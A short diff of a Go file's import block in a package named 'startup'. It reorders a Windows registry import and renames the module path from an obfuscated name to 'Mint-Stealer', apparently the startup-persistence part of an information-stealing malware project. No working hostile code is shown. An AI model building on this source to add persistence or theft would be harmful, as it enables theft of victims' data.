@@ -1,11 +1,12 @@
 package startup
 
 import (
-	"golang.org/x/sys/windows/registry"
 	"os"
 
-	"github.com/0xFl4q/1237FHJQSDF1234/utils/fileutil"
-	"github.com/0xFl4q/1237FHJQSDF1234/utils/program"
+	"golang.org/x/sys/windows/registry"
+
+	"github.com/0xFl4q/Mint-Stealer/utils/fileutil"
+	"github.com/0xFl4q/Mint-Stealer/utils/program"
 )
 
 func Run() error {
